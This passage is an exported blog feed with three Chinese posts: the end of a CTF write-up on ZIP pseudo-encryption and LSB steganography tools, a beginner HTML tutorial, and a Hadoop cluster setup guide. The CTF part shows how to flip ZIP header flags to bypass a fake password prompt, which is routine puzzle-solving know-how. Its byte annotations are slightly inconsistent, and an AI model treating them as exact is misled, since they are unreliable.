<p><strong>a.压缩源文件数据区：</strong></p>
<p>50 4B 03 04：这是头文件标记（0x04034b50）<br> 14 00：解压文件所需 pkware 版本<br> 09 00：全局方式位标记（有无加密）<br> 08 00：压缩方式<br> 50 A3：最后修改文件时间<br> A5 4A：最后修改文件日期<br> 21 38 76 64：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 08 00：文件名长度<br> 00 00：扩展记录长度</p>
<p>666C61672E7478744BCB494CAF764CC935F4D3753272D7CD0ED50D8EF20CA80500</p>
<p><strong>b.压缩源文件目录区:</strong></p>
<p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br> 1F 00：压缩使用的 pkware 版本<br> 14 00：解压文件所需 pkware 版本<br> 09 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br> 08 00：压缩方式<br> 50 A3：最后修改文件时间<br> A5 4A：最后修改文件日期<br> 21 38 76 65：CRC-32校验（1480B516）<br> 19 00 00 00：压缩后尺寸（25）<br> 17 00 00 00：未压缩尺寸（23）<br> 08 00：文件名长度<br> 24 00：扩展字段长度<br> 00 00：文件注释长度<br> 00 00：磁盘开始号<br> 00 00：内部文件属性<br> 20 00 00 00：外部文件属性<br> 00 00 00 00：局部头部偏移量<br> 666C61672E7478740A00200000000000010018000FF504D59AC5D201461FCB8A9AC5D201461FCB8A9AC5D201</p>
<p><strong>c.压缩源文件目录结束标志:</strong></p>
<p>50 4B 05 06：目录结束标记<br> 00 00：当前磁盘编号<br> 00 00：目录区开始磁盘编号<br> 01 00：本磁盘上纪录总数<br> 01 00：目录区中纪录总数<br> 5A 00 00 00：目录区尺寸大小<br> 3F 00 00 00：目录区对第一张磁盘的偏移量<br> 00 00 00：ZIP 文件注释长度</p>
<h4 id="识别真假加密"><a href="#识别真假加密" class="headerlink" title="识别真假加密"></a>识别真假加密</h4><p><strong>无加密</strong><br> 压缩源文件数据区的全局加密应当为00 00<br> 且压缩源文件目录区的全局方式位标记应当为00 00</p>
<p><strong>假加密</strong><br> 压缩源文件数据区的全局加密应当为00 00<br> 且压缩源文件目录区的全局方式位标记应当为09 00</p>
<p><strong>真加密</strong><br> 压缩源文件数据区的全局加密应当为09 00<br> 且压缩源文件目录区的全局方式位标记应当为09 00</p>
<p>把09 00 改成00 00 之后，保存，重新打开，即可看到flag</p>
<h3 id="8-Steghide"><a href="#8-Steghide" class="headerlink" title="8.Steghide"></a>8.Steghide</h3><h3 id="9-cloacked-pixel"><a href="#9-cloacked-pixel" class="headerlink" title="9.cloacked-pixel"></a>9.cloacked-pixel</h3><p>用于lsb解密，但是没有密码</p>
<p>python2 lsb.py extract flag.png 1.txt password</p>
]]></content>
      <categories>
        <category>第一届DMCTF夺旗赛</category>
      </categories>
  </entry>
  <entry>
    <title>HTML学习</title>
    <url>/post/9b6eaec3.html</url>
    <content><![CDATA[<p>　　了解HTML的基本属性<span id="more"></span></p>
<h1 id="1-表格"><a href="#1-表格" class="headerlink" title="1.表格"></a>1.表格</h1><h2 id="1-1-nbsp-和-lt-和-gt"><a href="#1-1-nbsp-和-lt-和-gt" class="headerlink" title="1.1 \&nbsp;和\&lt;和\&gt;"></a>1.1 \&nbsp;和\&lt;和\&gt;</h2><div class="table-container">
<table>
<thead>
<tr>
<th>标签</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>\&nbsp;</td>
<td>显示“ ”符号</td>
</tr>
<tr>
<td>\&lt;</td>
<td>显示“&lt;”号</td>
</tr>
<tr>
<td>\&gt;</td>
<td>显示“&gt;”号</td>
</tr>
</tbody>
</table>
</div>
<h2 id="1-2-table表格"><a href="#1-2-table表格" class="headerlink" title="1.2 table表格"></a>1.2 table表格</h2><p>table标签包括tr（行）、td（单元格）、th（单元格，比td多的是加粗和居中）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置边框1px，宽度为300px，高度为20px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;300px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;20px&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--align是对齐方式--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>a<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>b<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>c<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>d<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>e<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>f<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>g<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>h<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>i<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>j<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>k<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">td</span>&gt;</span>l<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="1-3-colspan和rowspan合并"><a href="#1-3-colspan和rowspan合并" class="headerlink" title="1.3 colspan和rowspan合并"></a>1.3 colspan和rowspan合并</h2><div class="table-container">
<table>
<thead>
<tr>
<th>标签</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr>
<td>colspan</td>
<td>删除下面的一行</td>
</tr>
<tr>
<td>rowspan</td>
<td>删除谁都可以</td>
</tr>
</tbody>
</table>
</div>
<h2 id="1-4-thead和tbody和tfoot"><a href="#1-4-thead和tbody和tfoot" class="headerlink" title="1.4 thead和tbody和tfoot"></a>1.4 thead和tbody和tfoot</h2><h1 id="2-超链接或热点接"><a href="#2-超链接或热点接" class="headerlink" title="2.超链接或热点接"></a>2.超链接或热点接</h1><p>超链接使用：\<a href="">\</a>，href（hot reference 热引用）</p>
<p>超链接的特点：有下划线，鼠标放上去是个小手</p>
<p>超链接有个target属性：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>值</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>_blank</td>
<td>新窗口打开</td>
</tr>
<tr>
<td>_self</td>
<td>当前窗口打开（默认方式）</td>
</tr>
<tr>
<td>_top</td>
<td>顶级窗口打开</td>
</tr>
<tr>
<td>_parent</td>
<td>父窗口打开</td>
</tr>
</tbody>
</table>
</div>
<p>图片超链接：\<img src=""/></p>
<h1 id="3-列表"><a href="#3-列表" class="headerlink" title="3.列表"></a>3.列表</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--有序列表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;I&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>水果<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">&quot;A&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>苹果<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>西瓜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>草莓<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>蔬菜<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--无序列表--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;circle&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>中国<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;square&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>河南<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">&quot;disc&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>洛阳<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>郑州<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>济源<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>商丘<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>宁夏<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>广东<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>西安<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>美国<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>英国<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>显示效果如下：</p>
<p><img src="https://s3.ax1x.com/2021/01/11/s1xXgx.png" alt="s1xXgx.png"></p>
<h1 id="4-表单"><a href="#4-表单" class="headerlink" title="4.表单"></a>4.表单</h1><p>用于收集用户信息，点击提交按钮提交数据给服务器</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--表单项写了name属性的，一律会提交给服务器。--&gt;</span>&gt;</span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登陆&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以下是完整的表单提交例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- form表单method属性：</span></span><br><span class="line"><span class="comment">       get：采用get方式提交的时候，用户提交的信息会显示在浏览器的地址栏上。</span></span><br><span class="line"><span class="comment">       post：采用post方式提交的时候，用户提交的信息不回显示在浏览器地址栏上。</span></span><br><span class="line"><span class="comment">       当用户提交的信息中含有敏感信息，例如：密码，建议采用post方式提交 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">       用户名</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       密码</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       确认密码</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       性别</span><br><span class="line">       <span class="comment">&lt;!--默认选择checked--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">checked</span> /&gt;</span>男</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span>女<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       兴趣爱好:</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;smoke&quot;</span> /&gt;</span>抽烟</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;drink&quot;</span> /&gt;</span>喝酒</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;fireHair&quot;</span> /&gt;</span>烫头<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       学历</span><br><span class="line">       <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;grade&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;小学&quot;</span>&gt;</span>小学<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;初中&quot;</span>&gt;</span>初中<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--默认选择selected--&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;高中&quot;</span> <span class="attr">selected</span>&gt;</span>高中<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;专科&quot;</span>&gt;</span>专科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;本科&quot;</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       简介</span><br><span class="line">       <span class="comment">&lt;!--文本域，文本域没有value属性，填写的就是value--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">name</span>=<span class="string">&quot;introduce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="5-下拉列表支持多选"><a href="#5-下拉列表支持多选" class="headerlink" title="5.下拉列表支持多选"></a>5.下拉列表支持多选</h1><p>multiple支持多选，size设置条目数量</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> &gt;</span>河南省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> &gt;</span>河北省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> &gt;</span>山西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> &gt;</span>山东省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">option</span> &gt;</span>陕西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="6-控件"><a href="#6-控件" class="headerlink" title="6.控件"></a>6.控件</h1><h2 id="1-file控件"><a href="#1-file控件" class="headerlink" title="1.file控件"></a>1.file控件</h2><p>文件上传专用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2-hidden控件"><a href="#2-hidden控件" class="headerlink" title="2.hidden控件"></a>2.hidden控件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端学习</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>Hadoop集群环境搭建1</title>
    <url>/post/dd9fb84a.html</url>
    <content><![CDATA[<p>　　这个配置方法并不是很完善，，另外了些新的搭建方法，详情请见<a href="/post/4496e9f0.html" title="Hadoop集群环境搭建2">Hadoop集群环境搭建2</a><span id="more"></span>&lt;/font&gt;</p>
<h1 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h1><p>　　4台linux虚拟机（master、node1、node2、node3）安装过程不再赘述，提醒：在安装时候选择带GNOME桌面更加方便，也可以单独配置一台之后，克隆虚拟机，如果使用虚拟机克隆的方法搭建，参考一下文章</p>
<p><a href="https://blog.csdn.net/qq_44373783/article/details/103960578">https://blog.csdn.net/qq_44373783/article/details/103960578</a></p>
<p><a href="https://www.cnblogs.com/pcxie/p/7747317.html">https://www.cnblogs.com/pcxie/p/7747317.html</a></p>
<p><a href="https://www.cnblogs.com/laov/p/3421479.html">https://www.cnblogs.com/laov/p/3421479.html</a></p>
<p>用到虚拟机克隆：<a href="https://blog.csdn.net/huanbia/article/details/51658439">https://blog.csdn.net/huanbia/article/details/51658439</a></p>
<h2 id="1-更改各主机名字"><a href="#1-更改各主机名字" class="headerlink" title="(1)更改各主机名字"></a>(1)更改各主机名字</h2><p>　　为了能够更方便的识别主机，将四台虚拟机的名字分别修改为master、node1、node2、node3</p>
<p>注意切换到root账户下</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/etc</span> <span class="string">//</span>进入配置目录</span><br><span class="line"></span><br><span class="line">vi hostname  <span class="string">//</span>编程hostname配置文件</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/DWSWuR"><img src="https://s3.ax1x.com/2020/11/30/DWSWuR.jpg" alt="DWSWuR.jpg"></a></p>
<p><a href="https://imgchr.com/i/DWSfD1"><img src="https://s3.ax1x.com/2020/11/30/DWSfD1.jpg" alt="DWSfD1.jpg"></a></p>
<p>点击Esc，在:wq保存退出</p>
<p>另外三个虚拟机同样操作</p>
<h2 id="2-开启主机的DHCP模式，自动获取ip地址"><a href="#2-开启主机的DHCP模式，自动获取ip地址" class="headerlink" title="(2)开启主机的DHCP模式，自动获取ip地址"></a>(2)开启主机的DHCP模式，自动获取ip地址</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/etc/y</span>sconfig/network-scripts</span><br><span class="line">vi ifcfg-ens33</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/DWS5E6"><img src="https://s3.ax1x.com/2020/11/30/DWS5E6.jpg" alt="DWS5E6.jpg"></a></p>
<p><a href="https://imgchr.com/i/DWSxVP"><img src="https://s3.ax1x.com/2020/11/30/DWSxVP.jpg" alt="DWSxVP.jpg"></a></p>
<p>重启网卡</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">service<span class="built_in"> network </span>restart</span><br></pre></td></tr></table></figure>
<p>在四台虚拟机中分别进行以上操作</p>
<p>之后输入ip addr，记下四个虚拟机的ip地址</p>
<p><a href="https://imgchr.com/i/DWSjbt"><img src="https://s3.ax1x.com/2020/11/30/DWSjbt.jpg" alt="DWSjbt.jpg"></a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>主机名</th>
<th>ip地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>master</td>
<td>192.168.136.131</td>
</tr>
<tr>
<td>node1</td>
<td>192.168.136.130</td>
</tr>
<tr>
<td>node2</td>
<td>192.168.136.129</td>
</tr>
<tr>
<td>node3</td>
<td>192.168.136.132</td>
</tr>
</tbody>
</table>
</div>
<h2 id="3-配置hosts"><a href="#3-配置hosts" class="headerlink" title="(3)配置hosts"></a>(3)配置hosts</h2><h1 id="master"><a href="#master" class="headerlink" title="master"></a>master</h1><p>配置hosts主要是为了让机器能够相互识别</p>
<p><em>注：hosts文件是域名分析文件，在hosts文件内配置了ip地址和主机名的对应关系，配置之后，通过主机名，电脑就可以定位到相应的ip地址</em></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>hosts</span><br></pre></td></tr></table></figure>
<p>在hosts文件中输入一下内容：</p>
<p><a href="https://imgchr.com/i/DWSXDI"><img src="https://s3.ax1x.com/2020/11/30/DWSXDI.jpg" alt="DWSXDI.jpg"></a></p>
<h2 id="4-在master节点中："><a href="#4-在master节点中：" class="headerlink" title="(4)在master节点中："></a>(4)在master节点中：</h2><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh-keygen</span></span><br></pre></td></tr></table></figure>
<p>ssh一路回车</p>
<p><a href="https://imgchr.com/i/DWSOKA"><img src="https://s3.ax1x.com/2020/11/30/DWSOKA.jpg" alt="DWSOKA.jpg"></a></p>
<p>使用如下命令将公钥复制到node1、node2和node3节点中：</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@node1</span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/DWSqvd"><img src="https://s3.ax1x.com/2020/11/30/DWSqvd.jpg" alt="DWSqvd.jpg"></a></p>
<p>再分别执行</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@localhost</span><br><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@node2</span><br><span class="line">ssh-<span class="keyword">copy</span>-<span class="built_in">id</span> root@node3</span><br></pre></td></tr></table></figure>
<p>输入ssh node1实验是否能免密登陆</p>
<p><em>注意：ssh免密设置后会在如下目录生成四个文件</em></p>
<p><a href="https://imgchr.com/i/DWSH8e"><img src="https://s3.ax1x.com/2020/11/30/DWSH8e.jpg" alt="DWSH8e.jpg"></a></p>
<h1 id="2-JDK环境安装"><a href="#2-JDK环境安装" class="headerlink" title="2.JDK环境安装"></a>2.JDK环境安装</h1><h2 id="1-新建目录放至JDK"><a href="#1-新建目录放至JDK" class="headerlink" title="(1)新建目录放至JDK"></a>(1)新建目录放至JDK</h2><p>在master中新建目录/opt/bigdata/java</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir <span class="regexp">/opt/</span>bigdata/java</span><br></pre></td></tr></table></figure>
<p>此目录下存放hadoop大数据所需要的环境包</p>
<p>将下载好的JDK包上传至master主机中</p>
<p><a href="https://imgchr.com/i/DWSbgH"><img src="https://s3.ax1x.com/2020/11/30/DWSbgH.jpg" alt="DWSbgH.jpg"></a></p>
